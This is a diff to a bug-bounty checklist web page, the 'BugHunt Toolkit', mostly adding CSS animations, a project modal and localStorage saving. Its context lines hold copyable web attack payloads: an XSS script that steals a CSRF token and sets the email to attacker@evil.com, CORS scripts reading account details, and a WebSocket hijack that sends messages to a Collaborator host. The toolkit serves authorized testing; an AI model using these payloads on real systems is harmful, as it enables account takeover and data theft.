@@ -21,6 +21,113 @@
         --dim: #6b7f94;
         --mono: 'JetBrains Mono', monospace;
         --sans: 'Syne', sans-serif;
+        --ease-out-quint: cubic-bezier(0.22, 1, 0.36, 1);
+        --ease-spring: cubic-bezier(0.34, 1.56, 0.64, 1);
+      }
+
+      /* Keyframes */
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.25;
+        }
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+      @keyframes fadeUp {
+        from {
+          opacity: 0;
+          transform: translateY(14px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @keyframes slideInLeft {
+        from {
+          opacity: 0;
+          transform: translateX(-16px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+      @keyframes shimmer {
+        0% {
+          background-position: -600px 0;
+        }
+        100% {
+          background-position: 600px 0;
+        }
+      }
+      @keyframes progressFill {
+        from {
+          width: 0%;
+        }
+      }
+      @keyframes checkPop {
+        0% {
+          transform: scale(0.6);
+          opacity: 0.4;
+        }
+        60% {
+          transform: scale(1.2);
+        }
+        100% {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      @keyframes sectionOpen {
+        from {
+          opacity: 0;
+          transform: translateY(-6px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @keyframes dotPop {
+        0% {
+          transform: scale(1);
+        }
+        40% {
+          transform: scale(1.7);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+      @keyframes glowPulse {
+        0%,
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 229, 160, 0);
+        }
+        50% {
+          box-shadow: 0 0 10px 2px rgba(0, 229, 160, 0.2);
+        }
+      }
+      @keyframes sbReveal {
+        from {
+          opacity: 0;
+          max-height: 0;
+        }
+        to {
+          opacity: 1;
+          max-height: 2000px;
+        }
       }
       * {
         box-sizing: border-box;
@@ -34,6 +141,14 @@
         font-size: 13px;
         line-height: 1.6;
         min-height: 100vh;
+        background-image:
+          linear-gradient(rgba(255, 255, 255, 0.011) 1px, transparent 1px),
+          linear-gradient(
+            90deg,
+            rgba(255, 255, 255, 0.011) 1px,
+            transparent 1px
+          );
+        background-size: 40px 40px;
       }
       header {
         background: var(--surface);
@@ -47,6 +162,25 @@
         z-index: 100;
         gap: 12px;
         flex-wrap: wrap;
+        animation: fadeIn 0.4s var(--ease-out-quint) both;
+        overflow: hidden;
+      }
+      /* moving shimmer line along header bottom */
+      header::after {
+        content: '';
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        height: 1px;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(0, 229, 160, 0.4),
+          transparent
+        );
+        background-size: 600px 1px;
+        animation: shimmer 4s linear infinite;
       }
       .logo {
         font-family: var(--sans);
@@ -56,6 +190,7 @@
         display: flex;
         align-items: center;
         gap: 8px;
+        animation: slideInLeft 0.5s var(--ease-out-quint) 0.1s both;
       }
       .logo-dot {
         width: 8px;
@@ -63,16 +198,9 @@
         background: var(--accent);
         border-radius: 50%;
         box-shadow: 0 0 8px var(--accent);
-        animation: pulse 2s infinite;
-      }
-      @keyframes pulse {
-        0%,
-        100% {
-          opacity: 1;
-        }
-        50% {
-          opacity: 0.3;
-        }
+        animation:
+          pulse 2s ease-in-out infinite,
+          dotPop 0.6s var(--ease-spring) 0.35s both;
       }
       .target-bar {
         display: flex;
@@ -82,6 +210,15 @@
         border: 1px solid var(--border);
         border-radius: 6px;
         padding: 6px 12px;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+      }
+      .target-bar:focus-within {
+        border-color: rgba(0, 229, 160, 0.5);
+        box-shadow:
+          0 0 0 2px rgba(0, 229, 160, 0.1),
+          0 0 14px rgba(0, 229, 160, 0.08);
       }
       .target-bar label {
         color: var(--accent);
@@ -187,17 +324,23 @@
         font-family: var(--mono);
         font-size: 11px;
         text-align: left;
-        transition: all 0.15s;
+        transition:
+          color 0.18s,
+          background 0.18s,
+          border-color 0.18s,
+          transform 0.15s var(--ease-spring);
         border-left: 2px solid transparent;
       }
       .pb:hover {
         color: var(--text);
         background: var(--panel);
+        transform: translateX(2px);
       }
       .pb.active {
         color: var(--accent);
         background: rgba(0, 229, 160, 0.06);
         border-left-color: var(--accent);
+        animation: glowPulse 3s ease-in-out infinite;
       }
       .pnum {
         width: 18px;
@@ -211,6 +354,13 @@
         font-size: 9px;
         font-weight: 700;
         flex-shrink: 0;
+        transition:
+          background 0.2s,
+          border-color 0.2s,
+          transform 0.15s var(--ease-spring);
+      }
+      .pb:hover .pnum {
+        transform: scale(1.1);
       }
       .pb.active .pnum {
         background: rgba(0, 229, 160, 0.15);
@@ -303,6 +453,10 @@
         border-radius: 8px;
         margin-bottom: 14px;
         overflow: visible;
+        transition: border-color 0.2s;
+      }
+      .sec:hover {
+        border-color: rgba(255, 255, 255, 0.07);
       }
       .sh {
         display: flex;
@@ -315,7 +469,7 @@
         transition: background 0.15s;
       }
       .sh:hover {
-        background: rgba(255, 255, 255, 0.02);
+        background: rgba(255, 255, 255, 0.025);
       }
       .sh.open {
         border-bottom-color: var(--border);
@@ -334,11 +488,15 @@
         border-radius: 50%;
         background: var(--accent2);
         flex-shrink: 0;
+        transition: transform 0.2s var(--ease-spring);
+      }
+      .sh:hover .sd {
+        transform: scale(1.4);
       }
       .stg {
         color: var(--muted);
         font-size: 10px;
-        transition: transform 0.2s;
+        transition: transform 0.25s var(--ease-out-quint);
       }
       .stg.open {
         transform: rotate(90deg);
@@ -349,6 +507,7 @@
       }
       .sb.open {
         display: block;
+        animation: sectionOpen 0.22s var(--ease-out-quint) both;
       }
       .cb {
         position: relative;
@@ -357,6 +516,10 @@
         border-radius: 6px;
         margin: 9px 0;
         overflow: hidden;
+        transition: border-color 0.2s;
+      }
+      .cb:hover {
+        border-color: rgba(0, 184, 255, 0.2);
       }
       .cbh {
         display: flex;
@@ -382,12 +545,20 @@
         font-size: 11px;
         padding: 3px 9px;
         cursor: pointer;
-        transition: all 0.15s;
+        transition:
+          color 0.2s,
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.15s var(--ease-spring);
       }
       .cpb:hover {
         color: var(--accent);
         border-color: var(--accent);
         background: rgba(0, 229, 160, 0.06);
+        transform: translateY(-1px);
+      }
+      .cpb:active {
+        transform: scale(0.95);
       }
       .cpb.copied {
         color: var(--accent);
@@ -419,13 +590,16 @@
         border-bottom: 1px solid rgba(255, 255, 255, 0.04);
         cursor: pointer;
         border-radius: 4px;
-        transition: background 0.1s;
+        transition:
+          background 0.12s,
+          padding-left 0.15s;
       }
       .ci:last-child {
         border-bottom: none;
       }
       .ci:hover {
-        background: rgba(255, 255, 255, 0.02);
+        background: rgba(255, 255, 255, 0.025);
+        padding-left: 7px;
       }
       .cbox {
         width: 15px;
@@ -437,18 +611,29 @@
         display: flex;
         align-items: center;
         justify-content: center;
-        transition: all 0.15s;
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.15s var(--ease-spring),
+          box-shadow 0.2s;
         font-size: 9px;
+      }
+      .cbox:hover {
+        border-color: var(--accent);
+        transform: scale(1.1);
       }
       .cbox.chk {
         background: var(--accent);
         border-color: var(--accent);
         color: #000;
+        animation: checkPop 0.3s var(--ease-spring) both;
+        box-shadow: 0 0 8px rgba(0, 229, 160, 0.4);
       }
       .ctxt {
         color: var(--text);
         font-size: 12px;
         line-height: 1.5;
+        transition: color 0.2s;
       }
       .ctxt.chk {
         color: var(--muted);
@@ -593,7 +778,11 @@
         font-size: 11px;
         padding: 4px 10px;
         cursor: pointer;
-        transition: all 0.15s;
+        transition:
+          color 0.2s,
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.15s var(--ease-spring);
         white-space: nowrap;
         flex-shrink: 0;
       }
@@ -601,6 +790,10 @@
         color: var(--accent2);
         border-color: var(--accent2);
         background: rgba(0, 184, 255, 0.06);
+        transform: translateY(-1px);
+      }
+      .dlb:active {
+        transform: scale(0.95);
       }
       .gab {
         background: linear-gradient(
@@ -616,9 +809,28 @@
         font-weight: 700;
         padding: 10px 18px;
         cursor: pointer;
-        transition: all 0.2s;
+        transition:
+          background 0.2s,
+          box-shadow 0.2s,
+          transform 0.15s var(--ease-spring);
         width: 100%;
         letter-spacing: 0.5px;
+        position: relative;
+        overflow: hidden;
+      }
+      .gab::after {
+        content: '';
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(
+          120deg,
+          transparent 30%,
+          rgba(255, 255, 255, 0.07) 50%,
+          transparent 70%
+        );
+        opacity: 0;
+        transition: opacity 0.2s;
+        background-size: 200% 100%;
       }
       .gab:hover {
         background: linear-gradient(
@@ -626,7 +838,17 @@
           rgba(0, 229, 160, 0.25),
           rgba(0, 184, 255, 0.2)
         );
-        box-shadow: 0 0 20px rgba(0, 229, 160, 0.15);
+        box-shadow:
+          0 0 24px rgba(0, 229, 160, 0.2),
+          0 2px 8px rgba(0, 0, 0, 0.3);
+        transform: translateY(-1px);
+      }
+      .gab:hover::after {
+        opacity: 1;
+        animation: shimmer 0.7s linear;
+      }
+      .gab:active {
+        transform: scale(0.98);
       }
       .toast {
         position: fixed;
@@ -640,12 +862,17 @@
         font-size: 12px;
         font-weight: 700;
         z-index: 9999;
-        transform: translateY(60px);
+        transform: translateY(60px) scale(0.9);
         opacity: 0;
-        transition: all 0.3s;
+        transition:
+          transform 0.3s var(--ease-spring),
+          opacity 0.3s;
+        box-shadow:
+          0 8px 32px rgba(0, 0, 0, 0.5),
+          0 0 0 1px rgba(255, 255, 255, 0.04);
       }
       .toast.show {
-        transform: translateY(0);
+        transform: translateY(0) scale(1);
         opacity: 1;
       }
       hr.div {
@@ -695,6 +922,24 @@
           1.02
         ); /* Better browser compatibility than scale: 120% */
       }
+      .reset-btn {
+        background: none;
+        border: 1px solid rgba(255, 51, 102, 0.4);
+        border-radius: 4px;
+        color: #ff3366;
+        font-family: var(--mono);
+        font-size: 11px;
+        font-weight: 700;
+        padding: 4px 11px;
+        cursor: pointer;
+        letter-spacing: 0.5px;
+        transition: all 0.15s;
+      }
+      .reset-btn:hover {
+        background: rgba(255, 51, 102, 0.1);
+        border-color: #ff3366;
+        box-shadow: 0 0 8px rgba(255, 51, 102, 0.2);
+      }
     </style>
   </head>
   <body>
@@ -705,13 +950,31 @@
       </div>
       <div class="target-bar">
         <label>TARGET</label>
-        <input type="text" id="targetInput" placeholder="target.com" />
+        <span type="text" id="targetInput" placeholder="target.com"></span>
       </div>
       <div class="hdr-right">
         <span id="gChecks" style="color: var(--dim); font-size: 11px"
           >0 / 0 checks</span
         >
         <div class="prog-badge" id="gPct">0%</div>
+        <button
+          class="reset-btn"
+          id="newProjectBtn"
+          title="Create a new project"
+        >
+          + New Project
+        </button>
+        <a
+          href="projects.html"
+          class="reset-btn"
+          style="
+            text-decoration: none;
+            color: var(--accent2);
+            border-color: rgba(0, 184, 255, 0.4);
+          "
+          title="Manage saved projects"
+          >⊞ Projects</a
+        >
       </div>
     </header>
 
@@ -1438,6 +1701,23 @@ cat subfinder.txt amass.txt crtsh_subs.txt alienvault_subs.txt \
   | grep -E ".*\.TARGET$" &gt; all_subs.txt
 
 echo "[*] Total subdomains: $(wc -l &lt; all_subs.txt)"</pre
+                >
+              </div>
+            </div>
+          </div>
+          <div class="sec">
+            <div class="sh">
+              <div class="st"><span class="sd"></span>Url's in document</div>
+              <span class="stg">▶</span>
+            </div>
+            <div class="sb">
+              <div class="cb">
+                <div class="cbh">
+                  <span class="cl">javascript</span
+                  ><button class="cpb">⎘ Copy</button>
+                </div>
+                <pre>
+Array.from(document.querySelectorAll("a")).map(el => el.href);</pre
                 >
               </div>
             </div>
@@ -3341,13 +3621,13 @@ toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().construct
 
 # XSS to bypass CSRF (from lab: exploiting XSS to bypass CSRF defenses)
 &lt;script&gt;
-var req=new XMLHttpRequest();
+let req=new XMLHttpRequest();
 req.onload=handleResponse;
 req.open('get','/my-account',true);
 req.send();
 function handleResponse(){
-  var token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-  var changeReq=new XMLHttpRequest();
+  let token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+  let changeReq=new XMLHttpRequest();
   changeReq.open('post','/my-account/change-email',true);
   changeReq.send('csrf='+token+'&amp;email=attacker@evil.com');
 }
@@ -3663,7 +3943,7 @@ grep -rE "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|
                 <pre>
 # Lab 1: Basic origin reflection — steal API key
 &lt;script&gt;
-var req = new XMLHttpRequest();
+let req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://TARGET/accountDetails',true);
 req.withCredentials = true;
@@ -3675,7 +3955,7 @@ function reqListener() {
 
 # Lab 2: Trusted null origin bypass
 &lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
-  var req = new XMLHttpRequest();
+  let req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://TARGET/accountDetails',true);
   req.withCredentials = true;
@@ -3690,7 +3970,7 @@ function reqListener() {
 # 2. Use that subdomain as origin (http:// is trusted = XSS escalates to CORS data theft)
 &lt;script&gt;
 document.location="http://stock.TARGET.com/?productId=4
-  &lt;script&gt;var req=new XMLHttpRequest();
+  &lt;script&gt;let req=new XMLHttpRequest();
   req.onload=reqListener;
   req.open('get','https://TARGET/accountDetails',true);
   req.withCredentials=true;req.send();
@@ -4592,7 +4872,7 @@ X-Forwarded-Host: attacker.com
 # Lab 2: Cross-site WebSocket hijacking (CSWSH)
 # Handshake uses only cookies, no CSRF token = hijackable
 &lt;script&gt;
-var ws = new WebSocket('wss://TARGET/chat');
+let ws = new WebSocket('wss://TARGET/chat');
 ws.onopen = function() { ws.send("READY"); };
 ws.onmessage = function(event) {
   fetch('https://BURP-COLLAB.oastify.com?d='+btoa(event.data));
@@ -6799,73 +7079,631 @@ echo "=== Recon Summary ==="
     </div>
     <!-- end layout -->
 
+    <footer
+      style="
+        background: var(--surface);
+        border-top: 1px solid var(--border);
+        padding: 12px 24px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        flex-wrap: wrap;
+      "
+    >
+      <div style="display: flex; align-items: center; gap: 8px">
+        <div
+          style="
+            width: 7px;
+            height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            box-shadow: 0 0 6px var(--accent);
+          "
+        ></div>
+        <span
+          style="
+            font-family: var(--sans);
+            font-weight: 800;
+            font-size: 13px;
+            color: #fff;
+            text-transform: uppercase;
+          "
+          >roxoi</span
+        >
+        <span style="color: var(--border); font-size: 11px">|</span>
+        <span style="color: var(--dim); font-size: 11px">BugHunt Toolkit</span>
+      </div>
+      <div style="color: var(--muted); font-size: 11px; letter-spacing: 0.3px">
+        © <span id="footerYear"></span>
+        <span
+          style="
+            color: var(--accent);
+            font-weight: 700;
+            text-transform: uppercase;
+          "
+          >roxoi</span
+        >
+        <span style="margin: 0 6px; color: var(--border)">·</span>
+        For authorized security testing only
+        <span style="margin: 0 6px; color: var(--border)">·</span>
+        <a
+          href="projects.html"
+          style="color: var(--accent2); text-decoration: none; font-weight: 600"
+          >⊞ Projects</a
+        >
+      </div>
+    </footer>
+
     <div class="toast" id="toast"></div>
+
+    <!-- No-project splash screen (shown when no projects exist) -->
+    <div
+      id="noProjectScreen"
+      style="
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: var(--bg);
+        z-index: 300;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        gap: 0;
+      "
+    >
+      <div style="text-align: center; max-width: 440px; padding: 32px 24px">
+        <div style="font-size: 48px; margin-bottom: 16px">🎯</div>
+        <div
+          style="
+            font-family: var(--sans);
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+          "
+        >
+          Welcome to BugHunt Toolkit
+        </div>
+        <div
+          style="
+            color: var(--dim);
+            font-size: 13px;
+            line-height: 1.7;
+            margin-bottom: 28px;
+          "
+        >
+          No projects yet. Create your first project to start tracking a bug
+          bounty target.
+        </div>
+        <button
+          id="splashCreateBtn"
+          style="
+            background: linear-gradient(
+              135deg,
+              rgba(0, 229, 160, 0.15),
+              rgba(0, 184, 255, 0.1)
+            );
+            border: 1px solid var(--accent);
+            border-radius: 6px;
+            color: var(--accent);
+            font-family: var(--mono);
+            font-size: 13px;
+            font-weight: 700;
+            padding: 11px 28px;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: all 0.2s;
+          "
+        >
+          + Create First Project
+        </button>
+        <div
+          style="
+            margin-top: 32px;
+            color: var(--muted);
+            font-size: 11px;
+            letter-spacing: 0.5px;
+          "
+        >
+          © <span id="splashYear"></span>
+          <span
+            style="
+              color: var(--accent);
+              font-weight: 700;
+              text-transform: uppercase;
+            "
+            >roxoi</span
+          >
+          — BugHunt Toolkit
+        </div>
+      </div>
+    </div>
+
+    <!-- New Project Modal -->
+    <div
+      id="newProjectModal"
+      style="
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.78);
+        z-index: 400;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      "
+    >
+      <div
+        style="
+          background: var(--surface);
+          border: 1px solid var(--border);
+          border-radius: 10px;
+          padding: 26px 28px;
+          width: 520px;
+          max-width: 96vw;
+        "
+      >
+        <div
+          style="
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+          "
+        >
+          <div
+            style="
+              font-family: var(--sans);
+              font-size: 17px;
+              font-weight: 800;
+              color: #fff;
+            "
+          >
+            + New Project
+          </div>
+          <button
+            id="modalCloseBtn"
+            style="
+              background: none;
+              border: 1px solid var(--border);
+              border-radius: 4px;
+              color: var(--dim);
+              font-size: 14px;
+              width: 28px;
+              height: 28px;
+              cursor: pointer;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              transition: all 0.15s;
+            "
+          >
+            ✕
+          </button>
+        </div>
+        <div style="display: flex; flex-direction: column; gap: 12px">
+          <div>
+            <label
+              style="
+                display: block;
+                font-size: 9px;
+                font-weight: 700;
+                letter-spacing: 1.2px;
+                text-transform: uppercase;
+                color: var(--muted);
+                margin-bottom: 5px;
+              "
+              >Target Domain *</label
+            >
+            <input
+              id="modalTarget"
+              type="text"
+              placeholder="target.com"
+              autocomplete="off"
+              style="
+                width: 100%;
+                background: #080b0e;
+                border: 1px solid var(--border);
+                border-radius: 5px;
+                color: var(--text);
+                font-family: var(--mono);
+                font-size: 13px;
+                padding: 8px 12px;
+                outline: none;
+                transition: border-color 0.15s;
+              "
+            />
+          </div>
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px">
+            <div>
+              <label
+                style="
+                  display: block;
+                  font-size: 9px;
+                  font-weight: 700;
+                  letter-spacing: 1.2px;
+                  text-transform: uppercase;
+                  color: var(--muted);
+                  margin-bottom: 5px;
+                "
+                >Platform</label
+              >
+              <select
+                id="modalPlatform"
+                style="
+                  width: 100%;
+                  background: #080b0e;
+                  border: 1px solid var(--border);
+                  border-radius: 5px;
+                  color: var(--text);
+                  font-family: var(--mono);
+                  font-size: 12px;
+                  padding: 8px 12px;
+                  outline: none;
+                "
+              >
+                <option value="">— select —</option>
+                <option value="HackerOne">HackerOne</option>
+                <option value="Bugcrowd">Bugcrowd</option>
+                <option value="Intigriti">Intigriti</option>
+                <option value="Synack">Synack</option>
+                <option value="YesWeHack">YesWeHack</option>
+                <option value="Private">Private Program</option>
+                <option value="Self-hosted">Self-hosted VDP</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+            <div>
+              <label
+                style="
+                  display: block;
+                  font-size: 9px;
+                  font-weight: 700;
+                  letter-spacing: 1.2px;
+                  text-transform: uppercase;
+                  color: var(--muted);
+                  margin-bottom: 5px;
+                "
+                >Priority / Severity Focus</label
+              >
+              <select
+                id="modalSeverity"
+                style="
+                  width: 100%;
+                  background: #080b0e;
+                  border: 1px solid var(--border);
+                  border-radius: 5px;
+                  color: var(--text);
+                  font-family: var(--mono);
+                  font-size: 12px;
+                  padding: 8px 12px;
+                  outline: none;
+                "
+              >
+                <option value="">— select —</option>
+                <option value="critical">Critical</option>
+                <option value="high">High</option>
+                <option value="medium">Medium</option>
+                <option value="low">Low</option>
+                <option value="info">Informational</option>
+              </select>
+            </div>
+          </div>
+          <div>
+            <label
+              style="
+                display: block;
+                font-size: 9px;
+                font-weight: 700;
+                letter-spacing: 1.2px;
+                text-transform: uppercase;
+                color: var(--muted);
+                margin-bottom: 5px;
+              "
+              >Notes (optional)</label
+            >
+            <input
+              id="modalNotes"
+              type="text"
+              placeholder="Scope, bounty range, initial recon notes..."
+              style="
+                width: 100%;
+                background: #080b0e;
+                border: 1px solid var(--border);
+                border-radius: 5px;
+                color: var(--text);
+                font-family: var(--mono);
+                font-size: 12px;
+                padding: 8px 12px;
+                outline: none;
+              "
+            />
+          </div>
+          <div
+            id="modalError"
+            style="
+              color: var(--danger);
+              font-size: 11px;
+              display: none;
+              padding: 4px 0;
+            "
+          ></div>
+          <div
+            style="
+              display: flex;
+              justify-content: flex-end;
+              gap: 8px;
+              margin-top: 4px;
+            "
+          >
+            <button
+              id="modalCancelBtn"
+              style="
+                background: none;
+                border: 1px solid var(--border);
+                border-radius: 4px;
+                color: var(--dim);
+                font-family: var(--mono);
+                font-size: 11px;
+                padding: 7px 16px;
+                cursor: pointer;
+                transition: all 0.15s;
+              "
+            >
+              Cancel
+            </button>
+            <button
+              id="modalCreateBtn"
+              style="
+                background: linear-gradient(
+                  135deg,
+                  rgba(0, 229, 160, 0.15),
+                  rgba(0, 184, 255, 0.1)
+                );
+                border: 1px solid var(--accent);
+                border-radius: 5px;
+                color: var(--accent);
+                font-family: var(--mono);
+                font-size: 12px;
+                font-weight: 700;
+                padding: 7px 20px;
+                cursor: pointer;
+                transition: all 0.2s;
+              "
+            >
+              Create Project
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
 
     <script>
       (function () {
-        var target = 'target.com';
+        // localStorage persistence layer
+        let LS_KEY = 'bbh_toolkit_state';
+        let DL_PROJECTS = 'bbh_deleted_targets';
+        let LS_PROJECTS = 'bbh_projects';
+        let MAX_PROJECTS = 50;
 
-        //  Sidebar navigation
-        var phaseBtns = document.querySelectorAll('.pb');
-        var phasePanels = document.querySelectorAll('.pp');
+        // Dynamic copyright year
+        let y = new Date().getFullYear();
+        document.getElementById('footerYear') &&
+          (document.getElementById('footerYear').textContent = y);
+        document.getElementById('splashYear') &&
+          (document.getElementById('splashYear').textContent = y);
+
+        function loadState() {
+          try {
+            let raw = localStorage.getItem(LS_KEY);
+            return raw ? JSON.parse(raw) : {};
+          } catch (e) {
+            return {};
+          }
+        }
+
+        function saveState(patch) {
+          try {
+            let current = loadState();
+            let next = Object.assign({}, current, patch);
+            localStorage.setItem(LS_KEY, JSON.stringify(next));
+            syncProjectsFromToolkit(next);
+          } catch (e) {
+            /* quota or private-mode — fail silently */
+          }
+        }
+
+        // live-sync the current toolkit state into bbh_projects
+        function syncProjectsFromToolkit(state) {
+          try {
+            let activeTarget = (state.target || '').trim();
+            if (!activeTarget) return;
+            let projects = JSON.parse(
+              localStorage.getItem(LS_PROJECTS) || '[]',
+            );
+            let idx = projects.findIndex(function (p) {
+              return (
+                p.target.trim().toLowerCase() === activeTarget.toLowerCase()
+              );
+            });
+            let now = new Date().toISOString();
+            let totalCount = document.querySelectorAll('.cbox').length || 203;
+            if (idx >= 0) {
+              // update existing
+              projects[idx].state = state;
+              projects[idx].checkedCount = (state.checked || []).length;
+              projects[idx].totalCount = totalCount;
+              projects[idx].savedAt = now;
+            } else {
+              // Only create if not in the deletion tombstone list
+              let tombstones = JSON.parse(
+                localStorage.getItem(DL_PROJECTS) || '[]',
+              );
+              let wasDeleted = tombstones.some(function (t) {
+                return t === activeTarget.toLowerCase();
+              });
+              if (!wasDeleted) {
+                projects.unshift({
+                  target: activeTarget,
+                  platform: '',
+                  severity: '',
+                  bounty: 0,
+                  notes: '',
+                  savedAt: now,
+                  checkedCount: (state.checked || []).length,
+                  totalCount: totalCount,
+                  state: state,
+                });
+              }
+            }
+            localStorage.setItem(
+              LS_PROJECTS,
+              JSON.stringify(projects.slice(0, MAX_PROJECTS)),
+            );
+          } catch (e) {
+            /* fail silently */
+          }
+        }
+
+        // Assign a stable index to every checklist item so we can address them
+        // by position across page loads without relying on dynamic IDs.
+        document.querySelectorAll('.ci').forEach(function (item, idx) {
+          item.setAttribute('data-ci-idx', idx);
+        });
+
+        // Restore persisted state
+        let state = loadState();
+
+        // 1. Target value
+        let target = state.target || 'target.com';
+        let targetEl = document.getElementById('targetInput');
+        targetEl.textContent = target;
+        if (state.target) {
+          targetEl.value = state.target;
+          document.getElementById('genAllBtn') &&
+            (document.getElementById('genAllBtn').textContent =
+              '⬇ Generate All Scripts for ' + state.target);
+        }
+
+        // 2. Checklist states
+        let checkedSet = state.checked ? new Set(state.checked) : new Set();
+        document.querySelectorAll('.ci').forEach(function (item) {
+          let idx = item.getAttribute('data-ci-idx');
+          if (checkedSet.has(idx)) {
+            let box = item.querySelector('.cbox');
+            let txt = item.querySelector('.ctxt');
+            box.classList.add('chk');
+            box.textContent = '✓';
+            txt.classList.add('chk');
+          }
+        });
+
+        // 3. Active phase
+        let activePhase =
+          state.activePhase != null ? String(state.activePhase) : '0';
+
+        // 4. Open accordion sections (stored as array of section indices)
+        let openSections = state.openSections
+          ? new Set(state.openSections)
+          : new Set();
+
+        // Assign stable indices to all section headers
+        document.querySelectorAll('.sh').forEach(function (head, idx) {
+          head.setAttribute('data-sh-idx', idx);
+        });
+
+        // Restore open sections
+        document.querySelectorAll('.sh').forEach(function (head) {
+          let idx = head.getAttribute('data-sh-idx');
+          if (openSections.has(idx)) {
+            let body = head.nextElementSibling;
+            let tog = head.querySelector('.stg');
+            head.classList.add('open');
+            if (body) body.classList.add('open');
+            if (tog) tog.classList.add('open');
+          }
+        });
+
+        // Sidebar navigation
+        let phaseBtns = document.querySelectorAll('.pb');
+        let phasePanels = document.querySelectorAll('.pp');
+
+        function activatePhase(n) {
+          phaseBtns.forEach(function (b) {
+            b.classList.remove('active');
+          });
+          phasePanels.forEach(function (p) {
+            p.classList.remove('active');
+          });
+          let btn = document.querySelector('.pb[data-phase="' + n + '"]');
+          if (btn) btn.classList.add('active');
+          let panel = document.getElementById('pp' + n);
+          if (panel) panel.classList.add('active');
+          if (n === '15') {
+            document.getElementById('twarn').style.display =
+              document.getElementById('targetInput').value ? 'none' : 'block';
+          }
+        }
+
+        // Restore saved active phase
+        activatePhase(activePhase);
 
         phaseBtns.forEach(function (btn) {
           btn.addEventListener('click', function () {
-            var n = this.getAttribute('data-phase');
-            phaseBtns.forEach(function (b) {
-              b.classList.remove('active');
-            });
-            phasePanels.forEach(function (p) {
-              p.classList.remove('active');
-            });
-            this.classList.add('active');
-            document.getElementById('pp' + n).classList.add('active');
-            if (n === '15') {
-              document.getElementById('twarn').style.display =
-                document.getElementById('targetInput').value ? 'none' : 'block';
-            }
+            let n = this.getAttribute('data-phase');
+            activatePhase(n);
+            saveState({ activePhase: n });
           });
         });
 
-        //  Section toggle ─
+        // Section toggle
         document.querySelectorAll('.sh').forEach(function (head) {
           head.addEventListener('click', function () {
-            var body = this.nextElementSibling;
-            var tog = this.querySelector('.stg');
+            let body = this.nextElementSibling;
+            let tog = this.querySelector('.stg');
+            let idx = this.getAttribute('data-sh-idx');
             if (body.classList.contains('open')) {
               body.classList.remove('open');
               this.classList.remove('open');
               if (tog) tog.classList.remove('open');
+              openSections.delete(idx);
             } else {
               body.classList.add('open');
               this.classList.add('open');
               if (tog) tog.classList.add('open');
+              openSections.add(idx);
             }
+            saveState({ openSections: Array.from(openSections) });
           });
         });
 
-        //  Checklist
+        // Checklist
         document.querySelectorAll('.ci').forEach(function (item) {
           item.addEventListener('click', function () {
-            var box = this.querySelector('.cbox');
-            var txt = this.querySelector('.ctxt');
+            let box = this.querySelector('.cbox');
+            let txt = this.querySelector('.ctxt');
+            let idx = this.getAttribute('data-ci-idx');
             if (box.classList.contains('chk')) {
               box.classList.remove('chk');
               box.textContent = '';
               txt.classList.remove('chk');
+              checkedSet.delete(idx);
             } else {
               box.classList.add('chk');
               box.textContent = '✓';
               txt.classList.add('chk');
+              checkedSet.add(idx);
             }
+            saveState({ checked: Array.from(checkedSet) });
             updateProgress();
           });
         });
 
         function updateProgress() {
-          var all = document.querySelectorAll('.cbox').length;
-          var done = document.querySelectorAll('.cbox.chk').length;
-          var pct = all > 0 ? Math.round((done / all) * 100) : 0;
+          let all = document.querySelectorAll('.cbox').length;
+          let done = document.querySelectorAll('.cbox.chk').length;
+          let pct = all > 0 ? Math.round((done / all) * 100) : 0;
           document.getElementById('oFill').style.width = pct + '%';
           document.getElementById('oPct').textContent = pct + '%';
           document.getElementById('gPct').textContent = pct + '%';
@@ -6873,11 +7711,11 @@ echo "=== Recon Summary ==="
             done + ' / ' + all + ' checks';
         }
 
-        //  Copy buttons ─
+        // Copy buttons
         document.querySelectorAll('.cpb').forEach(function (btn) {
           btn.addEventListener('click', function () {
-            var pre = this.closest('.cb').querySelector('pre');
-            var text = pre.textContent.replace(/TARGET/g, target);
+            let pre = this.closest('.cb').querySelector('pre');
+            let text = pre.textContent.replace(/TARGET/g, target);
             navigator.clipboard
               .writeText(text)
               .then(function () {
@@ -6890,8 +7728,7 @@ echo "=== Recon Summary ==="
                 }, 2000);
               })
               .catch(function () {
-                // fallback for non-https
-                var ta = document.createElement('textarea');
+                let ta = document.createElement('textarea');
                 ta.value = text;
